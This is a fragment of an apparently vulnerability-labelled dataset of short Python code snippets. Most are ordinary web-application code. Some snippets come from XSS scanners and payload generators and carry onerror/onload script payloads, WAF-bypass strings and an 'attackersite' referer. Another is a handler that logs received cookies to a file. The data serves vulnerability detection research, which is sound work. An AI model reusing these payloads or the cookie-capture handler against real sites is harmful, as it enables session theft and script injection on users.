try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact", "label": 0}, {"snippet_id": 37211, "code": " from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list", "label": 1}, {"snippet_id": 8718, "code": ": 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$',", "label": 0}, {"snippet_id": 10494, "code": "=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self", "label": 0}, {"snippet_id": 46448, "code": ".name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']=0 response['id", "label": 0}, {"snippet_id": 6802, "code": " for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section, 'authn_info_mongo_uri') @property def max_authn_failures_per_month(self): \"\"\" Disallow login", "label": 0}, {"snippet_id": 3050, "code": " import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with", "label": 0}, {"snippet_id": 24055, "code": " be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout", "label": 0}, {"snippet_id": 18209, "code": "/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/", "label": 1}, {"snippet_id": 19896, "code": ".default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get(", "label": 1}, {"snippet_id": 8316, "code": "'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]", "label": 0}, {"snippet_id": 52444, "code": "(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows", "label": 0}, {"snippet_id": 45275, "code": " type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2", "label": 0}, {"snippet_id": 16769, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(", "label": 1}, {"snippet_id": 20877, "code": "\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile", "label": 0}, {"snippet_id": 23066, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 615, "code": "'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET", "label": 1}, {"snippet_id": 43758, "code": "\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t", "label": 0}, {"snippet_id": 27796, "code": " isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json", "label": 0}, {"snippet_id": 31663, "code": ".orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800,", "label": 0}, {"snippet_id": 24026, "code": "=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 13570, "code": "', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name", "label": 0}, {"snippet_id": 20227, "code": " fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ", "label": 0}, {"snippet_id": 24259, "code": " BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try", "label": 0}, {"snippet_id": 43228, "code": "\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '", "label": 0}, {"snippet_id": 20292, "code": " @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec", "label": 0}, {"snippet_id": 2031, "code": ", \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite", "label": 0}, {"snippet_id": 26222, "code": "'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id'", "label": 0}, {"snippet_id": 6645, "code": " of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames:", "label": 0}, {"snippet_id": 18187, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 53936, "code": ".method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n----------------", "label": 0}, {"snippet_id": 43807, "code": "\"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields", "label": 0}, {"snippet_id": 10922, "code": " else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self)", "label": 0}, {"snippet_id": 32864, "code": " self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s", "label": 1}, {"snippet_id": 14865, "code": "' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using", "label": 0}, {"snippet_id": 24370, "code": " tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for", "label": 0}, {"snippet_id": 50352, "code": "(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST when the client is sending data to the server. Args: request(Request): Incoming request. \"\"\" csessid=request.args", "label": 0}, {"snippet_id": 5170, "code": "/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>", "label": 0}, {"snippet_id": 28529, "code": "\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: \" +serv +\"\\n\" \t\tlog=open(log_path +\"/config_edit", "label": 0}, {"snippet_id": 32696, "code": "=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>')", "label": 0}, {"snippet_id": 8105, "code": ", include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 2732, "code": "\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 19062, "code": " settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), )", "label": 0}, {"snippet_id": 25961, "code": "[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', ", "label": 0}, {"snippet_id": 43722, "code": " for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1", "label": 0}, {"snippet_id": 33341, "code": " get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases", "label": 0}, {"snippet_id": 16308, "code": "\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^", "label": 0}, {"snippet_id": 48560, "code": "\"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid", "label": 0}, {"snippet_id": 8313, "code": " url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>", "label": 0}, {"snippet_id": 42395, "code": ".options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif", "label": 0}, {"snippet_id": 25162, "code": ".exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio, DatePickerWidget", "label": 0}, {"snippet_id": 11647, "code": "'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 48781, "code": " import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists", "label": 0}, {"snippet_id": 12479, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 49621, "code": ", self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect", "label": 0}, {"snippet_id": 11925, "code": "'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url(", "label": 0}, {"snippet_id": 36961, "code": " published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor", "label": 0}, {"snippet_id": 4424, "code": " payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return", "label": 0}, {"snippet_id": 35763, "code": "=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) ", "label": 0}, {"snippet_id": 34939, "code": "() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self", "label": 0}, {"snippet_id": 53471, "code": " c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data", "label": 0}, {"snippet_id": 47061, "code": ".api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete", "label": 0}, {"snippet_id": 34773, "code": " default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t", "label": 0}, {"snippet_id": 27711, "code": "._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status):", "label": 0}, {"snippet_id": 43075, "code": ".fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants", "label": 0}, {"snippet_id": 20708, "code": ".accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views", "label": 0}, {"snippet_id": 50556, "code": " data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input':", "label": 0}, {"snippet_id": 50880, "code": ". Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments", "label": 0}, {"snippet_id": 25713, "code": " elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0.00'), ) elif", "label": 0}, {"snippet_id": 54267, "code": "] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values", "label": 1}, {"snippet_id": 37843, "code": " global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t", "label": 1}, {"snippet_id": 2208, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url", "label": 0}, {"snippet_id": 2766, "code": "//\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if", "label": 0}, {"snippet_id": 46780, "code": " RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER='react:comment_ids_liked_by:%s:%s' class", "label": 0}, {"snippet_id": 41253, "code": ".form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\",", "label": 1}, {"snippet_id": 4882, "code": "\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"", "label": 1}, {"snippet_id": 5309, "code": "'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed", "label": 0}, {"snippet_id": 12412, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 33981, "code": "\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere", "label": 0}, {"snippet_id": 47850, "code": "=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user", "label": 1}, {"snippet_id": 19104, "code": ".test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase", "label": 0}, {"snippet_id": 24738, "code": " them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format", "label": 0}, {"snippet_id": 3321, "code": "=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header", "label": 0}, {"snippet_id": 30152, "code": "('action_hap') is not None and serv is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv,", "label": 0}, {"snippet_id": 30046, "code": "=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path)) \t\t", "label": 0}, {"snippet_id": 25607, "code": " self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial=(cartpos.attendee_name_parts", "label": 0}, {"snippet_id": 7359, "code": "'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 5706, "code": "\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http", "label": 0}, {"snippet_id": 8388, "code": "'RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops", "label": 0}, {"snippet_id": 33174, "code": "(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler", "label": 0}, {"snippet_id": 5938, "code": "%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" '", "label": 0}, {"snippet_id": 3752, "code": "'ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads", "label": 0}, {"snippet_id": 27843, "code": " status==403 or status==401: self.render_forbidden(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self", "label": 0}, {"snippet_id": 53697, "code": "(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return j2_env.get_template('templates/eb/config.yml').render", "label": 1}, {"snippet_id": 25166, "code": " mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget, TimePickerWidget, UploadedFileWidget", "label": 0}, {"snippet_id": 31607, "code": "(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv", "label": 0}, {"snippet_id": 19061, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager", "label": 0}, {"snippet_id": 35910, "code": " self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue ", "label": 0}, {"snippet_id": 27362, "code": "[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id'", "label": 0}, {"snippet_id": 53028, "code": ".dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={", "label": 0}, {"snippet_id": 47390, "code": ".add_content(PlainText('<h3>Edit user \"' +profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id", "label": 0}, {"snippet_id": 45643, "code": "['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators", "label": 0}, {"snippet_id": 16825, "code": "?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 24939, "code": "*args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get(", "label": 0}, {"snippet_id": 40030, "code": "\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot", "label": 0}, {"snippet_id": 14243, "code": ": urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid", "label": 0}, {"snippet_id": 17195, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 10199, "code": "(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 13662, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=", "label": 1}, {"snippet_id": 4142, "code": " try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme", "label": 0}, {"snippet_id": 17900, "code": ".views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=", "label": 0}, {"snippet_id": 30551, "code": "=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s", "label": 0}, {"snippet_id": 17277, "code": " include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', ", "label": 0}, {"snippet_id": 24440, "code": ".serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity", "label": 0}, {"snippet_id": 3753, "code": ",'ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 46579, "code": "(request.user) response={ 'result': searcher.delete_collections([collection['id'] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST", "label": 0}, {"snippet_id": 29080, "code": ") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect(serv, **kwargs): \timport sql \tscript=\"syn_flood_protect.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \t", "label": 0}, {"snippet_id": 53827, "code": "=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str", "label": 1}, {"snippet_id": 456, "code": "='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url", "label": 1}, {"snippet_id": 53762, "code": " help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest, application_name", "label": 0}, {"snippet_id": 48548, "code": " Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return", "label": 0}, {"snippet_id": 2374, "code": " print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or", "label": 0}, {"snippet_id": 44668, "code": "-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\"", "label": 0}, {"snippet_id": 6384, "code": " with static files to be served. \"\"\" return self.config.get(self.section, 'static_dir') @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters", "label": 